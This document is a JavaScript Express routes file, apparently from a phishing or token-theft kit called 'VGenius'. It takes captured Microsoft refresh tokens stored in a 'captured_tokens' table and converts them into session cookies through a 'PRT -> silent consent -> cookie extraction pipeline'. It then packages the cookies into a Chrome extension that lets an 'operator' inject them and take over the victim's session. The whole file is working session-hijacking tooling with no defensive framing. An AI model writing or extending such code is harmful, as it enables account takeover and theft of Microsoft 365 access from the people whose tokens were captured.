/**
 * VGenius Extension Routes
 *
 * Serves the Chrome extension and extension data for cookie injection.
 *
 * Endpoints:
 * - GET /api/tokens/:id/extension-data - Returns cookies in extension format
 * - GET /api/tokens/:id/extension      - Downloads the extension as a zip
 * - GET /api/extension/download        - Downloads the extension template
 */

'use strict';

const express = require('express');
const router = express.Router();

const db = require('../database/connection');
const { decrypt } = require('../utils/encrypt');
const cookieConverter = require('../services/cookieconverter');
const extensionBuilder = require('../services/extension-builder');
const config = require('../config/env');
const jwt = require('jsonwebtoken');

// Safe decrypt: null instead of throwing on bad/empty ciphertext.
// Ciphertext can be absent (older rows, partial captures) or unusable
// after a key rotation — either way a 500 is the wrong answer.
function safeDecrypt(val) {
  if (!val) return null;
  try {
    return decrypt(val);
  } catch (e) {
    return null;
  }
}

/**
 * Verify JWT from Authorization header or query param (for extension popup).
 */
function verifyAuth(req, res, next) {
  const jwtToken =
    req.headers.authorization?.replace('Bearer ', '') || req.query.jwt;

  if (!jwtToken) {
    return res.status(401).json({
      error: 'Authentication required',
    });
  }

  try {
    const decoded = jwt.verify(jwtToken, config.JWT_SECRET);

    req.user = decoded;
    next();
  } catch (err) {
    return res.status(401).json({
      error: 'Invalid or expired token',
    });
  }
}

/**
 * GET /api/tokens/:id/extension-data
 *
 * Returns cookies in the format needed by the Chrome extension.
 *
 * This is the PRIMARY endpoint for the extension popup.
 * It runs the full PRT -> silent consent -> cookie extraction pipeline
 * and returns the cookies as a structured array for chrome.cookies.set().
 */
router.get('/:id/extension-data', verifyAuth, async (req, res) => {
  try {
    // Fetch the token.
    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, req.user.user_id]
    );

    if (!tokens.length) {
      return res.status(404).json({
        error: 'Token not found',
      });
    }

    const token = tokens[0];

    const refreshToken = safeDecrypt(token.refresh_token_encrypted);

    const tenant =
      token.tenant || config.AZURE_TENANT || 'common';

    const clientId =
      token.client_id ||
      config.AZURE_CLIENT_ID ||
      '29d9ed98-a469-4536-ade2-f981bc1d605e';

    const accountType =
      token.account_type || 'work_school';

    const templateType =
      token.template_type || 'office';

    // Try the refresh-token path first. grant_type is always refresh_token on
    // the Microsoft token endpoint, so submitting an access token fails with
    // AADSTS9002313 ("Invalid request. Request is malformed or invalid.").
    let cookieResult = null;
    if (refreshToken) {
      cookieResult =
        await cookieConverter.convertTokensToCookies(
          refreshToken,
          templateType,
          tenant,
          token.email || null,
          accountType,
          req.user.user_id
        );

      if (cookieResult.success && cookieResult.cookies) {
        // Generate extension data.
        const extData = cookieConverter.generateExtensionData({
          ...cookieResult,
          templateType,
          accountType,
        });

        return res.json(extData);
      }
    }

    // No access-token fallback here: the Microsoft token endpoint is always
    // called with grant_type: 'refresh_token', so an access token is rejected
    // with AADSTS9002313 every time. Returning the real refresh-token error is
    // more useful than burning ~10s of endpoint calls on a guaranteed failure.
    return res.status(400).json({
      error: cookieResult && cookieResult.error
        ? cookieResult.error
        : 'No refresh token available for cookie extraction',
      hint: 'The refresh token may be expired or revoked. Try renewing it first.'
    });
  } catch (err) {
    console.error('[ExtensionData] Error:', err.message);

    return res.status(500).json({
      error: 'Server error during cookie extraction',
    });
  }
});

/**
 * GET /api/tokens/:id/extension
 *
 * Downloads the Chrome extension as individual files.
 * Returns a zip archive if the operator wants a one-click download.
 */
router.get('/:id/extension', verifyAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, req.user.user_id]
    );

    if (!tokens.length) {
      return res.status(404).json({
        error: 'Token not found',
      });
    }

    const token = tokens[0];

    const refreshToken = safeDecrypt(token.refresh_token_encrypted);

    const tenant =
      token.tenant || config.AZURE_TENANT || 'common';

    const accountType =
      token.account_type || 'work_school';

    const templateType =
      token.template_type || 'office';

    // Try to get fresh cookies.
    let preloadedCookies = null;

    if (refreshToken) {
      const cookieResult =
        await cookieConverter.convertTokensToCookies(
          refreshToken,
          templateType,
          tenant,
          token.email || null,
          accountType,
          req.user.user_id
        );

      if (cookieResult.success && cookieResult.cookies) {
        const extData = cookieConverter.generateExtensionData({
          ...cookieResult,
          templateType,
          accountType,
        });

        if (extData.success) {
          preloadedCookies = {
            ...extData,
            cookies: extData.cookies,
            target_url: extData.target_url,
          };
        }
      }
    }

    const apiBaseUrl =
      config.APP_URL || 'https://api.example.com';

    const extensionFiles = extensionBuilder.buildExtension({
      apiBaseUrl,
      cookies: preloadedCookies,
    });

    // Return as JSON with all files.
    return res.json({
      success: true,
      files: extensionFiles,
      file_count: Object.keys(extensionFiles).length,
      has_preloaded_cookies: !!preloadedCookies,
      instructions:
        'Extract all files to a folder, then load unpacked in Chrome/Edge.',
    });
  } catch (err) {
    console.error('[ExtensionDownload] Error:', err.message);

    return res.status(500).json({
      error: 'Server error during extension generation',
    });
  }
});

/**
 * GET /api/extension/download
 *
 * Downloads the extension template without pre-loaded cookies.
 * The operator enters Token ID and JWT in the popup.
 */
router.get('/download', async (req, res) => {
  try {
    const apiBaseUrl =
      config.APP_URL || 'https://api.example.com';

    const extensionFiles = extensionBuilder.buildExtension({
      apiBaseUrl,
    });

    return res.json({
      success: true,
      files: extensionFiles,
      file_count: Object.keys(extensionFiles).length,
    });
  } catch (err) {
    console.error('[ExtensionDownload] Error:', err.message);

    return res.status(500).json({
      error: 'Server error',
    });
  }
});

module.exports = router;
